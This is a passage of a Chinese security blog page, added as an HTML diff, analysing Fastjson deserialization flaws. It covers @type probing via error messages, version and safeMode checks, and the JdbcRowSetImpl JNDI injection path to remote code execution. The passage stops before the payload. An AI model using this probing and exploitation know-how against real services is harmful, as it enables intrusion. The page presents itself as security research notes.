@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/.svg" color="#222">
+  <meta name="google-site-verification" content="nQ1ot4TllsO_jg0_DRzKfQ4QLDbTG3fV22N4xxpzF3Q">
+  <meta name="msvalidate.01" content="63D9688A8F4C2AAAD74951EFBA3C541A">
+  <meta name="baidu-site-verification" content="codeva-bnmASICFhg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.cliayn.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0-前言​	记录fastjson的漏洞的测试心得,更为详细的可以参考大佬的安全笔记Java Web安全 第一步看报错类型。 构建报错类查看报错：&#123;@type:xxx.class,val:xxx.String&#125;等json;如果是 type not match，通常是顶层类型和接口期望类型不一致；如果是 autoType is not support，说明已经进了 Fastjson">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化分析">
+<meta property="og:url" content="https://blog.cliayn.top/2025/07/08/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+<meta property="og:site_name" content="乌篷船的博客">
+<meta property="og:description" content="0-前言​	记录fastjson的漏洞的测试心得,更为详细的可以参考大佬的安全笔记Java Web安全 第一步看报错类型。 构建报错类查看报错：&#123;@type:xxx.class,val:xxx.String&#125;等json;如果是 type not match，通常是顶层类型和接口期望类型不一致；如果是 autoType is not support，说明已经进了 Fastjson">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-07-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-10T08:46:43.000Z">
+<meta property="article:author" content="乌篷船">
+<meta property="article:tag" content="article">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://blog.cliayn.top/2025/07/08/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.cliayn.top/2025/07/08/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"2025/07/08/Fastjson反序列化漏洞分析/","title":"fastjson反序列化分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>fastjson反序列化分析 | 乌篷船的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">乌篷船的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">我当然是正态分布下的蠢材<br>可是啊<br>人生=δ(x−相信)</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-我的链接"><a href="/mylinks/" rel="section"><i class="fa fa-sitemap fa-fw"></i>我的链接</a></li><li class="menu-item menu-item-密文解密"><a href="/decrypt/" rel="section"><i class="fa fa-calendar fa-fw"></i>密文解密</a></li><li class="menu-item menu-item-webrtc"><a href="/WebRTC/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>WebRTC</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0-前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson-1-2-80-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">Fastjson 1.2.80 反序列化漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%AD%A5%E9%AA%A4%EF%BC%88%E4%BB%85%E8%AE%BF%E9%97%AE-HTTP-%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="nav-number">2.0.1.</span> <span class="nav-text">漏洞验证步骤（仅访问 HTTP 服务）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%87%86%E5%A4%87-Payload"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">1. 准备 Payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%90%AF%E5%8A%A8-HTTP-%E7%9B%91%E5%90%AC%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">2. 启动 HTTP 监听服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%8F%91%E9%80%81-Payload-%E5%88%B0%E7%9B%AE%E6%A0%87"><span class="nav-number">2.0.1.3.</span> <span class="nav-text">3. 发送 Payload 到目标</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.0.1.4.</span> <span class="nav-text">4. 验证漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">2.0.2.</span> <span class="nav-text">注意事项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"><span class="nav-number">2.0.3.</span> <span class="nav-text">补充说明</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson-1-2-80-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%EF%BC%88%E5%90%AB%E7%99%BD%E5%90%8D%E5%8D%95%E5%9C%BA%E6%99%AF%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E5%88%86%E6%9E%90"><span class="nav-number">3.0.0.1.</span> <span class="nav-text">报错分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E9%85%8D%E7%BD%AE%E6%A3%80%E6%9F%A5"><span class="nav-number">3.0.1.</span> <span class="nav-text">白名单配置检查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%98%BE%E5%BC%8F%E7%99%BD%E5%90%8D%E5%8D%95%E9%85%8D%E7%BD%AE"><span class="nav-number">3.0.1.1.</span> <span class="nav-text">1. 显式白名单配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-AutoType-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">3.0.1.2.</span> <span class="nav-text">2. AutoType 白名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%89%B9%E5%AE%9A%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8"><span class="nav-number">3.0.1.3.</span> <span class="nav-text">3. 特定注解使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E7%8E%AF%E5%A2%83%E7%9A%84%E5%A2%9E%E5%BC%BA-Payload"><span class="nav-number">3.0.2.</span> <span class="nav-text">针对环境的增强 Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%A1%88-1%EF%BC%9AMyBatis-SQL-%E9%A9%B1%E5%8A%A8%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.2.1.</span> <span class="nav-text">方案 1：MyBatis SQL 驱动类利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%A1%88-2%EF%BC%9ASpring-JNDI-%E6%89%A9%E5%B1%95"><span class="nav-number">3.0.2.2.</span> <span class="nav-text">方案 2：Spring JNDI 扩展</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%A1%88-3%EF%BC%9ATomcat-JDBC-%E6%B1%A0%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.2.3.</span> <span class="nav-text">方案 3：Tomcat JDBC 池利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.0.3.</span> <span class="nav-text">漏洞验证步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%90%AF%E5%8A%A8-HTTP-%E7%9B%91%E6%8E%A7"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">1. 启动 HTTP 监控</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">2. 发送恶意请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E6%A0%87%E5%BF%97"><span class="nav-number">3.0.3.3.</span> <span class="nav-text">3. 验证成功标志</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">3.0.4.</span> <span class="nav-text">白名单绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%B1%BB%E5%90%8D%E6%B7%B7%E6%B7%86"><span class="nav-number">3.0.4.1.</span> <span class="nav-text">1. 类名混淆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%B5%8C%E5%A5%97%E7%99%BD%E5%90%8D%E5%8D%95%E7%B1%BB"><span class="nav-number">3.0.4.2.</span> <span class="nav-text">2. 嵌套白名单类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-MyBatis-%E5%88%AB%E5%90%8D%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.4.3.</span> <span class="nav-text">3. MyBatis 别名利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%B5%8B%E5%BB%BA%E8%AE%AE"><span class="nav-number">3.0.5.</span> <span class="nav-text">防护检测建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E7%9F%A9%E9%98%B5"><span class="nav-number">3.1.</span> <span class="nav-text">结果分析矩阵</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="乌篷船"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">乌篷船</p>
+  <div class="site-description" itemprop="description">记录笔记的网址<br>存在学习错误的地方请多指教</div>
+  
+  <div style="color: #002366; border-left: 3px solid #002366; padding-left: 5px; font-size: 12px; margin-top: 10px; text-align: left; line-height: 1.5;">
+    <strong>免责声明：<br></strong>本站所有渗透笔记仅供安全研究<br>禁止非法用途！
+  </div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:cliay55555@gmail.com" title="E-Mail → mailto:cliay55555@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+
+    
+      <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+      <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+      <div class="widget-wrap">
+          <div id="myCanvasContainer" class="widget tagcloud">
+              <canvas width="250" height="250" id="resCanvas" style="width:100%">
+                  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android-Studio/" rel="tag">Android Studio</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Article/" rel="tag">Article</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Attack-Analysis/" rel="tag">Attack Analysis</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Backend/" rel="tag">Backend</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blue-Team/" rel="tag">Blue Team</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burp-Suite/" rel="tag">Burp Suite</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Classification/" rel="tag">Classification</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Computer-info/" rel="tag">Computer-info</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cybersecurity/" rel="tag">Cybersecurity</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error-correcting/" rel="tag">Error correcting</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Honeypot/" rel="tag">Honeypot</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Information/" rel="tag">Information</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Information-Gathering/" rel="tag">Information Gathering</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Injection/" rel="tag">Injection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intrusion-Detection/" rel="tag">Intrusion Detection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/" rel="tag">Notes</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Official-account/" rel="tag">Official account</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Organize/" rel="tag">Organize</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Red-team/" rel="tag">Red team</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Test/" rel="tag">Test</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Two-dimensional/" rel="tag">Two-dimensional</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows-update/" rel="tag">Windows update</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/api/" rel="tag">api</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app/" rel="tag">app</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app-test/" rel="tag">app-test</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/article/" rel="tag">article</a><span class="tag-list-count">22</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/computer/" rel="tag">computer</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/console/" rel="tag">console</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exe/" rel="tag">exe</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/host/" rel="tag">host</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jwt/" rel="tag">jwt</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jython/" rel="tag">jython</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/key/" rel="tag">key</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/keys/" rel="tag">keys</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/n2n/" rel="tag">n2n</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/p2p/" rel="tag">p2p</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/payload/" rel="tag">payload</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/poc/" rel="tag">poc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/project/" rel="tag">project</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qBitTorrent/" rel="tag">qBitTorrent</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rss/" rel="tag">rss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-net/" rel="tag">web-net</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%89%E6%AC%A1%E5%85%83/" rel="tag">三次元</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%95%E7%89%87%E6%9C%BA/" rel="tag">单片机</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%9B%86/" rel="tag">数据集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8B%97/" rel="tag">狗</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B/" rel="tag">语言模型</a><span class="tag-list-count">1</span></li></ul>
+              </canvas>
+          </div>
+      </div>
+    
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.cliayn.top/2025/07/08/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="乌篷船">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="乌篷船的博客">
+      <meta itemprop="description" content="记录笔记的网址<br>存在学习错误的地方请多指教">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="fastjson反序列化分析 | 乌篷船的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastjson反序列化分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-07-09 00:00:00" itemprop="dateCreated datePublished" datetime="2025-07-09T00:00:00+08:00">2025-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-04-10 16:46:43" itemprop="dateModified" datetime="2026-04-10T16:46:43+08:00">2026-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Cybersecurity/" itemprop="url" rel="index"><span itemprop="name">Cybersecurity</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>13 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	记录<code>fastjson</code>的漏洞的测试心得,更为详细的可以参考大佬的安全笔记<a target="_blank" rel="noopener" href="https://github.com/javaweb-sec/javaweb-sec">Java Web安全</a></p>
+<p><strong>第一步看报错类型。</strong></p>
+<p>构建报错类查看报错：<code>&#123;@type:xxx.class,val:xxx.String&#125;</code>等<code>json</code>;<br>如果是 <code>type not match</code>，通常是顶层类型和接口期望类型不一致；如果是 <code>autoType is not support</code>，说明已经进了 Fastjson 的类型安全检查；如果返回的是业务提示，比如“请输入id”，说明对象已经成功落到业务层。这个区分对定位问题非常关键。你前面的日志已经足够证明：业务类可反序列化，危险类被拦截。</p>
+<p><strong>第二步看版本与配置。</strong><br> 优先从代码依赖、jar 文件名、启动参数、<code>fastjson.properties</code>、异常堆栈里确认版本和是否启用了 <code>safeMode</code>。Fastjson 官方文档明确给了三种开启 safeMode 的方式，且 safeMode 打开后会完全禁用 autoType。Fastjson 2.x 则是默认禁用 autoType、以更安全的方式设计。</p>
+<p><strong>第三步看“是否存在 AutoType”。</strong><br> 不是只看能不能写 <code>@type</code>，而是看它能不能把类型落到你控制的类上。你这里 <code>GetxxxParam</code> 能进业务层，说明接口的对象绑定链路存在；但 <code>BasicDataSource</code> 被拒，说明高危类型没过安全门槛。</p>
+<p><strong>第四步看是否“可绕过”。</strong><br> 可以直接按版本和官方公告判断：1.2.83 之前存在被修复的绕过问题，1.2.68 起有 safeMode；如果目标已经开了 safeMode，autoType 会被完全关闭。</p>
+<p><strong>第五步，不能绕过时就做业务类审计。</strong><br>没有历史漏洞则真正能做的部分：反编译 <code>GetxxxParam</code>(对应的业务类)，看 setter、构造函数、字段类型、后续 controller&#x2F;service 是否会继续调用它的方法。<code>Fastjson</code> 官方也提供了 <code>AutoTypeCheckHandler</code> 这类扩展点，说明很多场景最终要回到应用自己的类型与业务逻辑上看。</p>
+<span id="more"></span>
+
+<h1 id="Fastjson-1-2-80-反序列化漏洞分析"><a href="#Fastjson-1-2-80-反序列化漏洞分析" class="headerlink" title="Fastjson 1.2.80 反序列化漏洞分析"></a>Fastjson 1.2.80 反序列化漏洞分析</h1><p><strong>漏洞原理</strong><br>Fastjson 在反序列化时，攻击者通过构造特殊的 JSON 字符串，利用特定类（如 <code>JdbcRowSetImpl</code>）的 <code>setAutoCommit</code> 方法触发 JNDI 注入。当目标解析恶意 JSON 时，会向攻击者控制的 JNDI 服务器发起请求，加载远程恶意类，最终导致 RCE（远程代码执行）。1.2.83 版本虽修复了部分漏洞，但在未开启 <code>safeMode</code> 且存在可利用依赖时仍可能被攻击。</p>
+<p><strong>漏洞复现条件</strong></p>
+<ol>
+<li>Fastjson &lt; 1.2.83</li>
+<li>目标环境中存在 <code>com.sun.rowset.JdbcRowSetImpl</code> 类（通常存在于 JDK 或 Tomcat 中）</li>
+<li>目标未配置安全白名单或开启 <code>safeMode</code></li>
+</ol>
+<h3 id="漏洞验证步骤（仅访问-HTTP-服务）"><a href="#漏洞验证步骤（仅访问-HTTP-服务）" class="headerlink" title="漏洞验证步骤（仅访问 HTTP 服务）"></a>漏洞验证步骤（仅访问 HTTP 服务）</h3><h4 id="1-准备-Payload"><a href="#1-准备-Payload" class="headerlink" title="1. 准备 Payload"></a>1. 准备 Payload</h4><p>以下 Payload 会让目标服务器尝试连接 ：</p>
